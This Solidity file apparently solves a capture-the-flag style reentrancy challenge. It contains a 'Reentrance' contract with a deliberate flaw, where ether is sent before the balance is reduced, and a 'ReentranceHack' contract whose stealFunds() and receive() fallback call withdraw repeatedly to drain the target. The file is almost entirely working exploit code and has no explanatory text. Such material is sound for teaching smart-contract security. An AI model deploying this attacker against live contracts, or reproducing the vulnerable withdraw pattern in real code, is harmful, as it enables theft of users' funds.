// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReentranceHack {
    Reentrance public _target;
    event Received(uint256 _amount);

    constructor(address payable targetContract) public {
        _target = Reentrance(targetContract);
    }

    function stealFunds() public {
        uint256 balance = _target.balanceOf(address(this));
        require(balance > 0, "The contract should have a positive balance");

        // 0.0001 ether
        _target.withdraw(100000000000000);
    }

    function targetBalance() public view returns (uint256 balance) {
        return address(_target).balance;
    }

    receive() external payable {
        if (address(_target).balance > 0) {
            // 0.0001 ether
            _target.withdraw(100000000000000);
        }
    }
}
